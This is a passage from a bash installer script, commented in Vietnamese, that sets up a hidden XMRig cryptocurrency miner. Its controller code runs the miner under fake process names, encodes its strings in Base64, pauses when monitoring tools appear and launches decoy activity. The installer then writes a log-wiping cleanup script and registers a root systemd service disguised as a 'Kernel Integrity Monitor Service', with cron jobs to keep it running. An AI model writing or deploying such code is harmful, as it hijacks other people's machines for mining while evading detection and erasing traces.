    local actual_miner_binary_path="\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")"
    local wrapper_path="\$(decode_string "\$base_dir_encoded")/\$WRAPPER_BINARY_NAME"

    # Kiểm tra xem tiến trình có đang chạy với tên giả mạo không
    if pgrep -f "\$current_bin_name" > /dev/null; then
        log_message "Miner already running with fake name: \$current_bin_name. No action needed."
        return 0
    fi

    stop_miner # Dừng các tiến trình cũ trước khi khởi động lại

    if [ -n "\$WRAPPER_BINARY_NAME" ] && [ -f "\$wrapper_path" ] && [ -f "\$actual_miner_binary_path" ] && [ -f "\$miner_config_full_path" ]; then
        # Gọi C wrapper để khởi chạy XMRig với tên tiến trình giả mạo
        nohup "\$wrapper_path" "\$current_bin_name" "\$actual_miner_binary_path" "\$miner_config_full_path" > /dev/null 2>&1 &
        log_message "Miner started via C wrapper (fake name: \$current_bin_name, pid: \$!)."
    elif [ -f "\$actual_miner_binary_path" ] && [ -f "\$miner_config_full_path" ]; then
        # Fallback về cách khởi động XMRig trực tiếp nếu wrapper không có
        nohup "\$actual_miner_binary_path" -c "\$miner_config_full_path" > /dev/null 2>&1 &
        log_message "WARNING: C wrapper not available. Miner started directly (pid: \$!). Less stealthy."
    else
        log_message "ERROR: Missing miner binary, wrapper, or config file. Cannot start miner."
    fi
}

# Hàm để chạy một tác vụ nền giả mạo
run_fake_activity() {
    if (( RANDOM % 100 < CHANCE_FOR_FAKE_ACTIVITY )); then
        local activity_info_encoded=\${fake_activity_commands_encoded[\$RANDOM % \${#fake_activity_commands_encoded[@]}]}
        local activity_info=\$(decode_string "\$activity_info_encoded")

        local cmd=\$(echo "\$activity_info" | cut -d',' -f1)
        local min_duration=\$(echo "\$activity_info" | cut -d',' -f2)
        local max_duration=\$(echo "\$activity_info" | cut -d',' -f3)
        local activity_type=\$(echo "\$activity_info" | cut -d',' -f4)

        local duration_seconds=\$(( min_duration + RANDOM % (max_duration - min_duration + 1) ))

        # Chạy lệnh trong một subshell để nó không bị ảnh hưởng bởi các biến hoặc tín hiệu của script chính
        # Sử dụng 'bash -c' để đảm bảo biến MINE_DIR được mở rộng nếu cần trong lệnh cmd
        ( nohup bash -c "export MINER_DIR=\$(decode_string "\$base_dir_encoded"); timeout \$duration_seconds \$cmd" > /dev/null 2>&1 & )
        log_message "Running fake activity (\$activity_type) command: '\$cmd' for \$duration_seconds seconds."
    fi
}

# Hàm để kiểm tra XMRig có đang chạy và hoạt động không
is_xmrig_active() {
    local state_data=\$(cat "\$STATE_FILE" 2>/dev/null)
    local current_bin_name_encoded=\$(echo "\$state_data" | awk '{print \$3}')
    local current_bin_name="\$(decode_string "\$current_bin_name_encoded")"

    if [ -z "\$current_bin_name" ]; then return 1; fi

    # Kiểm tra xem có tiến trình nào chạy với tên giả mạo đó không
    if pgrep -f "\$current_bin_name" > /dev/null; then
        return 0
    fi
    return 1
}

# Hàm kiểm tra các tiến trình đáng ngờ
check_for_suspicious_processes() {
    local decoded_keywords=()
    for encoded_kw in "\${suspicious_process_keywords_encoded[@]}"; do
        decoded_keywords+=("\$(decode_string "\$encoded_kw")")
    done

    local ps_output=\$(ps aux) # Lấy đầu ra ps aux một lần để giảm tải

    for keyword in "\${decoded_keywords[@]}"; do
        # Tìm kiếm từ khóa trong output của ps, loại trừ chính tiến trình grep
        # và tiến trình master_controller.sh để tránh tự kill
        if echo "\$ps_output" | grep -F "\$keyword" | grep -v "grep" | grep -v "\$\$" | grep -v "master_controller.sh" > /dev/null; then
            log_message "WARNING: Suspicious process detected: '\$keyword'. Initiating pause."
            return 0 # True, suspicious process found
        fi
    done
    return 1 # False, no suspicious processes
}


# Logic điều khiển chính của miner
main_control() {
    local state_data=\$(cat "\$STATE_FILE" 2>/dev/null)
    local last_run_timestamp=\$(echo "\$state_data" | awk '{print \$1}')
    local current_profile_id=\$(echo "\$state_data" | awk '{print \$2}')
    local current_bin_name_encoded=\$(echo "\$state_data" | awk '{print \$3}')
    local long_pause_end_timestamp=\$(echo "\$state_data" | awk '{print \$4}')
    local suspicious_pause_end_timestamp=\$(echo "\$state_data" | awk '{print \$5}') # Thêm trường mới cho tạm dừng đáng ngờ
    local current_timestamp=\$(date +%s)

    # Nếu đang trong giai đoạn long pause, chỉ chạy fake activity và dừng miner
    if [ -n "\$long_pause_end_timestamp" ] && (( current_timestamp < long_pause_end_timestamp )); then
        stop_miner
        log_message "Still in long pause until \$(date -d @\$long_pause_end_timestamp). Miner stopped."
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
        run_fake_activity
        return 0
    fi

    # Nếu đang trong giai đoạn tạm dừng do phát hiện đáng ngờ
    if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp < suspicious_pause_end_timestamp )); then
        stop_miner
        log_message "Still in suspicious activity pause until \$(date -d @\$suspicious_pause_end_timestamp). Miner stopped."
        # Cập nhật timestamp hiện tại nhưng giữ nguyên thời gian kết thúc pause
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
        run_fake_activity
        return 0
    fi

    # Nếu không trong bất kỳ giai đoạn tạm dừng nào, kiểm tra lại các tiến trình đáng ngờ
    if check_for_suspicious_processes; then
        stop_miner
        local pause_duration=\$(( SUSPICIOUS_PAUSE_MIN_SECONDS + RANDOM % (SUSPICIOUS_PAUSE_MAX_SECONDS - SUSPICIOUS_PAUSE_MIN_SECONDS + 1) ))
        suspicious_pause_end_timestamp=\$(( current_timestamp + pause_duration ))
        log_message "Detected suspicious process. Pausing miner for \$((pause_duration / 60)) minutes."
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
        run_fake_activity
        return 0
    fi

    # Reset suspicious pause if no longer in pause and no suspicious processes are found
    if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp >= suspicious_pause_end_timestamp )); then
        log_message "Suspicious activity pause ended. Resuming normal operations."
        suspicious_pause_end_timestamp="" # Clear the pause end time
    fi

    # Logic chính để chạy/dừng miner
    local should_run_miner=0 # 0 = không chạy, 1 = chạy
    if is_xmrig_active; then
        # Miner đang chạy. Quyết định xem có nên dừng hoặc chuyển profile không.
        local profile_info=\${cpu_profiles_encoded[\$current_profile_id]}
        local decoded_profile_info=\$(decode_string "\$profile_info")
        local min_duration_minutes=\$(echo "\$decoded_profile_info" | cut -d',' -f4)
        local max_duration_minutes=\$(echo "\$decoded_profile_info" | cut -d',' -f5)

        local time_since_last_run_minutes=\$(( (current_timestamp - last_run_timestamp) / 60 ))

        # Nếu đã hết thời gian chạy của profile hoặc có cơ hội chuyển đổi
        if (( time_since_last_run_minutes >= max_duration_minutes )) || (( RANDOM % 100 < CHANCE_TO_SWITCH_PROFILE )); then
            stop_miner
            log_message "Miner finished current profile or switching. Stopping miner."

            # Có cơ hội tạm dừng dài
            if (( RANDOM % 100 < CHANCE_FOR_LONG_PAUSE )); then
                local pause_duration_hours=\$(( LONG_PAUSE_MIN_HOURS + RANDOM % (LONG_PAUSE_MAX_HOURS - LONG_PAUSE_MIN_HOURS + 1) ))
                long_pause_end_timestamp=\$(( current_timestamp + pause_duration_hours * 3600 ))
                log_message "Entering long pause for \$pause_duration_hours hours until \$(date -d @\$long_pause_end_timestamp)."
                # Lưu trạng thái với long pause mới, không khởi động miner
                echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
                run_fake_activity
                return 0
            fi

            # Chọn profile mới và tên binary mới
            current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
            if (( RANDOM % 100 < CHANCE_TO_CHANGE_BIN_NAME )); then
                current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
            else
                # Giữ tên binary hiện tại nếu không thay đổi
                if [ -z "\$current_bin_name_encoded" ]; then # Trường hợp khởi động lần đầu hoặc không có
                    current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
                fi
            fi
            should_run_miner=1 # Sẽ khởi động lại với profile mới
        else
            log_message "Miner still running current profile. Next check in $(( max_duration_minutes - time_since_last_run_minutes )) minutes."
            should_run_miner=0 # Tiếp tục chạy với cấu hình hiện tại
        fi
    else
        # Miner KHÔNG chạy. Quyết định có nên khởi động không.
        # Reset long pause end if it has passed
        if [ -n "\$long_pause_end_timestamp" ] && (( current_timestamp >= long_pause_end_timestamp )); then
            log_message "Long pause ended. Resuming normal operations."
            long_pause_end_timestamp="" # Clear the pause end time
        fi

        if [ -z "\$current_profile_id" ] || [ -z "\$current_bin_name_encoded" ]; then
            # Khởi tạo lần đầu hoặc sau khi dừng hoàn toàn
            current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
            current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
            log_message "Initializing miner with new profile and binary name."
        fi

        # Có cơ hội để chạy miner
        if (( RANDOM % 100 < CHANCE_TO_RUN )); then
            should_run_miner=1
            log_message "Chance to run met. Attempting to start miner."
        else
            log_message "Chance to run not met. Miner remains stopped."
        fi
    fi

    if [ "\$should_run_miner" -eq 1 ]; then
        start_miner "\$current_profile_id" "\$current_bin_name_encoded"
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
    else
        # Nếu không chạy miner, vẫn cập nhật timestamp để tránh sai lệch thời gian pause
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
    fi

    run_fake_activity # Luôn chạy fake activity bất kể miner có chạy hay không
}

# --- Cấu hình Systemd Service & Cron Job (Khởi động sau cài đặt) ---

echo "Tạo script dọn dẹp dấu vết (cleanup_traces.sh)..."
cat <<EOF > cleanup_traces.sh
#!/bin/bash
# Script dọn dẹp dấu vết. Chạy định kỳ để xóa các file log và trạng thái.

# Hàm giải mã chuỗi Base64 (cần có trong script này nếu nó chạy độc lập)
decode_string() {
    echo "\$1" | base64 -d
}

BASE_DIR_CLEANUP="\$(decode_string "$base_dir_encoded")" # Sử dụng biến đã được encode từ master_controller

# Xóa các file log của XMRig (nếu có)
find "\$BASE_DIR_CLEANUP" -name "xmrig_profile_*.log" -delete > /dev/null 2>&1

# Xóa log của controller
rm -f "\$BASE_DIR_CLEANUP/controller.log" > /dev/null 2>&1

# Xóa các file temp block và archive của fake activity
rm -f "\$BASE_DIR_CLEANUP/temp_block_*" > /dev/null 2>&1
rm -f "\$BASE_DIR_CLEANUP/temp_archive_*.tar.gz" > /dev/null 2>&1

# Xóa các file tạm trong /tmp mà script này có thể tạo ra
rm -f /tmp/temp_app_file_* > /dev/null 2>&1
rm -f /tmp/temp_app_data_* > /dev/null 2>&1

# Xóa lịch sử shell nếu được cài đặt để làm vậy (cẩn thận khi sử dụng)
# history -c && history -w
EOF
chmod +x cleanup_traces.sh
echo "Đã tạo script dọn dẹp dấu vết."

echo "Thiết lập Systemd service cho master_controller.sh..."
SERVICE_FILE_PATH="/etc/systemd/system/$SYSTEMD_SERVICE_NAME"

# Chú ý: Cần giải mã MINER_DIR ở đây để Systemd service file có đường dẫn chính xác
DECODED_MINER_DIR_FOR_SYSTEMD=$(echo "$MINER_DIR" | base64 -d)

cat <<EOF | sudo tee "$SERVICE_FILE_PATH" > /dev/null
[Unit]
Description=Kernel Integrity Monitor Service
After=network.target multi-user.target

[Service]
Type=simple
ExecStart=/bin/bash ${DECODED_MINER_DIR_FOR_SYSTEMD}/master_controller.sh
WorkingDirectory=${DECODED_MINER_DIR_FOR_SYSTEMD}
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload > /dev/null 2>&1
sudo systemctl enable "$SYSTEMD_SERVICE_NAME" > /dev/null 2>&1
sudo systemctl start "$SYSTEMD_SERVICE_NAME" > /dev/null 2>&1
echo "Systemd service '$SYSTEMD_SERVICE_NAME' đã được thiết lập và khởi động."

echo "Thêm cron job cho cleanup_traces.sh (chạy mỗi 4 giờ một lần)..."
# Sử dụng MINER_DIR trực tiếp vì cron không cần giải mã base64 như Systemd
(sudo crontab -l 2>/dev/null | grep -v -F "$MINER_DIR/cleanup_traces.sh"; echo "0 */4 * * * /bin/bash $MINER_DIR/cleanup_traces.sh > /dev/null 2>&1") | sudo crontab -
echo "Cron job cho cleanup_traces.sh đã được thêm."

# Thêm cron job để chạy master_controller.sh mỗi phút để đảm bảo tính ổn định và khả năng phục hồi
echo "Thêm cron job để chạy master_controller.sh mỗi phút (như một cơ chế dự phòng)..."
(sudo crontab -l 2>/dev/null | grep -v -F "$MINER_DIR/master_controller.sh"; echo "* * * * * /bin/bash $MINER_DIR/master_controller.sh > /dev/null 2>&1") | sudo crontab -
echo "Cron job cho master_controller.sh đã được thêm."

echo "Cài đặt hoàn tất. Miner sẽ chạy ẩn trong nền."
echo "Để kiểm tra trạng thái dịch vụ: sudo systemctl status $SYSTEMD_SERVICE_NAME"
echo "Để dừng dịch vụ: sudo systemctl stop $SYSTEMD_SERVICE_NAME"
echo "Để gỡ cài đặt: Chạy script gỡ cài đặt đã được cung cấp."
